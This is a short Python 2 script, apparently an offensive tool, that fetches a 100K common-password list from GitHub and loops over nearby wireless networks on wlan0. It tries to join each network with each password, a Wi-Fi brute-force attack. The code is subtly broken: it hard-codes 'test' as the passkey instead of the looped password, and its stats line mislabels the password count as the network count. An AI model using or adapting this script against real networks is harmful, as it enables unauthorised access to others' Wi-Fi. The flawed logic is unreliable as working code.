#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import urllib2

from wifi import Cell, Scheme, exceptions

# need `sudo` to show all networks
def start():




	# download most used passwords on github.com and build a dict
	print("Fetch top 100K most used passwords on Github...")
	url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt"
	response = urllib2.urlopen( url )
	txt = response.read()
	passwords = txt.splitlines()

	# get networks and print stats
	networks = Cell.all('wlan0')
	nb_loops =  len(passwords)*len(networks)
	print("{} networks founded. The programs will loop {} times!!".format( 
		len(passwords) , nb_loops ))

	# begin to loop
	nb_test = 0

	for password in passwords:

		for cell in networks:

				try:
					scheme = Scheme.for_cell('wlan0', 'home', cell, 'test')
					scheme.activate()
					print("Connect to {} with `{}` passkey works!!".format(cell, 'test'))
					sys.exit(0)
				except exceptions.ConnectionError as e:
					pass
				finally:
					nb_test += 1

				sys.stdout.write('\r{} / {}'.format( nb_test, nb_loops ))
				sys.stdout.flush()

	print("you are not lucky :'(")
		
